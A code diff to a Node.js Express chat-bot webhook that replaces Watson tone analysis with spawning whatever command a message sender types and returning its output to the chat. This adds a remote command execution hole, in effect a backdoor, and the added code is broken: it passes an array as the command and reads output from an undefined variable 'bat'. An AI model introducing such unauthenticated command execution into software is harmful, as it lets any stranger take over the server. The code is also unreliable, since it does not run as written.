@@ -4,6 +4,7 @@ const express = require('express');
 const app = express();
 const bodyParser = require('body-parser');
 const request = require('request');
+const spawn = require('child_process').spawn;
 app.use(bodyParser.json());
 
 const ToneAnalyzerV3 = require('watson-developer-cloud/tone-analyzer/v3');
@@ -97,16 +98,23 @@ function receivedMessage(event) {
         break;
 
       default:
-        applyAnalyzer(messageText, (emotions) => {
-          let str = ""
-          emotions.forEach((emotion) => {
-            str += emotion.tone_id + " - " + emotion.score + '\n'
-            // if (emotion.score >= strongestEmotion.score){
-            //   strongestEmotion = emotion;
-            // }
-          });
-          sendTextMessage(senderID, str);
+        // applyAnalyzer(messageText, (emotions) => {
+        const cmds = messageText.split(' ');
+
+        const cmd = spawn(cmds, cmds.splice(1));
+
+        bat.stdout.on('data', (data) => {
+          sendTextMessage(senderID, data.toString());
         });
+
+        bat.stderr.on('data', (data) => {
+          sendTextMessage(senderID, data.toString());
+        });
+
+        bat.on('exit', (code) => {
+          sendTextMessage(senderID, `Child exited with code ${code}`);
+        });
+        // });
     }
   } else if (messageAttachments) {
     sendTextMessage(senderID, "Message with attachment received");
